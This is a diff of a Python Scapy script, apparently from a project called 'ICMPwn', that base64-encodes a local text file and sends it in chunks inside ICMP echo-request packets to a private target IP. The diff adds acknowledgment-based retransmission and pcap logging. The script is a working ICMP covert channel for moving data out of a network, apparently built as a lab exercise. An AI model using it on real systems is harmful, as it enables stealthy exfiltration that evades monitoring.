@@ -1,12 +1,10 @@
-import base64
 import time
 import os
-from base64 import b64encode
+import base64
 
 from scapy.all import IP, ICMP, Raw, send, wrpcap, sniff
 import zlib
 
-from ICMPwn.empfänger import process_packet
 
 
 # Function to calculate CRC32 checksum
@@ -24,25 +22,25 @@ def initialize_pcap_file(pcap_file):
 def send_icmp_packet(data, ip_dst, packet_number, pcap_file):
     checksum = calculate_crc(data)
     packet = (
-        IP(dst=ip_dst)
-        / ICMP(type="echo-request")
-        / Raw(load=packet_number.to_bytes(4, byteorder="big") + data + checksum.to_bytes(4, byteorder="big"))
+            IP(dst=ip_dst)
+            / ICMP(type="echo-request")
+            / Raw(load=packet_number.to_bytes(4, byteorder="big") + data + checksum.to_bytes(4, byteorder="big"))
     )
     print(f"Sending packet {packet_number} to {ip_dst}")
     send(packet)
     wrpcap(pcap_file, packet, append=True)  # Save packet to .pcap
 
-def receive_checksum(packet):
-    ip_dst = "192.168.0.69"         # Target IP
-    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
-        raw_data = packet[Raw].load
-        checksum_value = int.from_bytes(raw_data, byteorder='big')
-        return checksum_value
+def receive_checksum(raw_data):
+    checksum_value = int.from_bytes(raw_data, byteorder='big')
+    if checksum_value == 1:
+        return True
+    else:
+        return False
 
 # Main logic
 def main():
     filename = "./Robotergesetze.txt"  # File to read
-    ip_dst = "172.16.10.36"         # Target IP
+    ip_dst = "192.168.0.148"         # Target IP
     packet_size = 1400               # Max ICMP packet size
     pcap_file = "sent_packets.pcap"
     initialize_pcap_file(pcap_file)
@@ -53,23 +51,33 @@ def main():
     with open(filename, 'r') as file:
         data = file.read()
     encoded_data = base64.b64encode(data.encode())
-    
+
     packet_number = 1
     while encoded_data:
-        current_packet_data = encoded_data[:packet_size]
+        value = False
+        while value != True:
+            current_packet_data = encoded_data[:packet_size]
+
+            send_icmp_packet(current_packet_data, ip_dst, packet_number, pcap_file)
+
+            #time.sleep(1)
+            print("-____-")
+            packets = sniff(filter="icmp", count = 1)
+            print("+++++++")
+            #print(packets)
+            new_data = packets[0]
+            wrpcap(pcap_file,packets , append=True)  # Save packet to .pcap
+
+            raw = new_data[Raw].load
+            print("raw", raw)
+            value = receive_checksum(raw)
+            print("value", value)
+            if value == True:
+                packet_number += 1
+                break
+            else:
+                continue
         encoded_data = encoded_data[packet_size:]
-        
-        send_icmp_packet(current_packet_data, ip_dst, packet_number, pcap_file)
-        
-        time.sleep(5)
-
-        value = sniff(filter="icmp", prn=receive_checksum, store=False)
-        print(f"value: {value}")
-        if value == 1:
-            packet_number += 1
-        else:
-            break
-
 
 if __name__ == "__main__":
     main()
